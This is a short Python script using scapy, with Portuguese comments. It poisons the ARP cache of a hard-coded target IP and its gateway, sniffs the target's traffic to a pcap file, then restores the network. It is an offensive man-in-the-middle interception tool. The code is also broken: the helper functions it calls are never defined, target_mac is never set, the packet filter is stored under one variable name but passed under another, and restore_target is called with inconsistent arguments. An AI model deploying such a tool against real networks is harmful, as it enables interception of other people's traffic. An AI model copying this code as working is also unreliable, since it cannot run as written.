from scapy.all import *
import os
import sys
import threading
import signal


interface = "en1"
#lembrar de editar o parametro para receber o ip dinamicamente
target_ip = "172.16.1.71"
#lembrar de editar o parametro para receber o ip dinamicamente
gateway_ip = "172.16.1.254"
packet_count = 1000

#define a nossa interface
conf.iface = interface

#desabilita a saída
conf.verb = 0

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" %(gateway_ip, gateway_mac))

#inicia processo de envenenamento
poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))

poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf, iface=interface)

    #grava os pacotes capturados
    wrpcap('arper.pcap',packets)

    #restaura a rede
    restore_target(gateway_ip, gateway_mac, target_mac)

except KeyboardInterrupt:
    #restaura a rede
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

    









